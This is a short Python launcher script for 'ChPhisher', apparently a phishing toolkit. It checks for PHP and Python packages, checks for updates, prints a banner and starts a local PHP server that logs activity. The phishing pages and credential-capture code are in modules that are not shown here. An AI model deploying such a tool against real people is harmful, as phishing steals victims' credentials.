#!/usr/bin/env python3
#  ____  _____  _    _  ____  ____  ____  ____     ____  _  _     ___  _   _  __  __  ___   ___  _  _ 
# (  _ \(  _  )( \/\/ )( ___)(  _ \( ___)(  _ \   (  _ \( \/ )   / __)( )_( )/. |/  )(__ \ / _ \( \( )
#  )___/ )(_)(  )    (  )__)  )   / )__)  )(_) )   ) _ < \  /   ( (__  ) _ ((_  _))(  / _/( (_) ))  ( 
# (__)  (_____)(__/\__)(____)(_)\_)(____)(____/   (____/ (__)    \___)(_) (_) (_)(__)(____)\___/(_)\_)
# Owner: Ch4120N
# GitHub: https://github.com/Ch4120N/ChPhisher

import sys
import shutil

from modules.config import IS_WINDOWS
from modules.ui import print_banner, print_serverinfo, print_failed
from modules.utils import (
    clear_screen, check_update, generate_log_name,
    local_server, wait_input
)


def check_dependencies():
    php_path = shutil.which('php')

    if not php_path:
        print_failed('PHP is not installed. After installation add PHP directory into system PATH')
        sys.exit(1)
    
    try:
        from colorama import Fore, init
        import psutil
        import requests
    except ImportError:
        print_failed(
            'Your not installed Python dependencies packages. Please install them using command below:\n'
            'python -m pip install -r requirements.txt' if IS_WINDOWS else 'python3 -m pip install -r requirements.txt --break-system-packages'
        )
        sys.exit(1)
    
    init(autoreset=True)


if __name__ == '__main__':
    check_dependencies()
    check_update()
    clear_screen()
    print_banner()
    server_config = local_server(generate_log_name())
    print_serverinfo(server_config)
    wait_input()